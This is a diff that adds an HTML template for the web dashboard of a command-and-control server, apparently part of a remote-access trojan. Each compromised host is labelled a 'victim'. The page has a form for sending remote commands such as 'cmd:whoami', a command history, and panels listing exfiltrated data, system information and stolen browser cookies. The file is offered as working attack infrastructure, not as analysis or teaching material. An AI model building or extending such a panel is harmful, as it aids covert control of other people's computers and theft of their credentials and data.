@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Victim: {{ victim.hostname }}</title>
+    <style>
+        body { font-family: 'Segoe UI', monospace; background: #121212; color: #00ff41; padding: 20px; }
+        .section { margin: 20px 0; border: 1px solid #333; padding: 15px; border-radius: 5px; background: #1e1e1e; }
+        pre { background: #000; padding: 10px; overflow-x: auto; color: #fff; font-size: 0.9em; border-left: 3px solid #00ff41; }
+        input, button { background: #333; color: #0f0; border: 1px solid #555; padding: 8px; border-radius: 3px; }
+        button:hover { background: #444; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>{{ victim.hostname }} <small>({{ victim.username }})</small></h1>
+    <p><code>ID: {{ victim_id }}</code></p>
+    
+    <div class="section">
+        <h3>📤 Send Command</h3>
+        <form method="POST" action="{{ url_for('send_command') }}">
+            <input type="hidden" name="victim_id" value="{{ victim_id }}">
+            <input type="text" name="command" placeholder="cmd:whoami" style="width: 300px;">
+            <button type="submit">Execute</button>
+        </form>
+    </div>
+    
+    <div class="section">
+        <h3>📥 Command History</h3>
+        {% for cmd in commands %}
+        <div>{{ cmd.created_at }}: <code>{{ cmd.command }}</code> (sent: {{ cmd.sent }})</div>
+        {% endfor %}
+    </div>
+    
+    <div class="section">
+        <h3>📤 Exfiltrated Data</h3>
+        {% for ex in exfils %}
+        <div style="margin-bottom: 15px;">
+            <strong>{{ ex.type }}</strong> <small>{{ ex.received_at }}</small>
+            <pre>{{ ex.content }}</pre>
+        </div>
+        {% endfor %}
+    </div>
+    
+    <div class="section">
+        <h3>ℹ️ System Info</h3>
+        <pre>{{ victim.sysinfo }}</pre>
+    </div>
+    
+    <div class="section">
+        <h3>🍪 Cookies</h3>
+        <pre>{{ victim.cookies }}</pre>
+    </div>
+</body>
+</html>
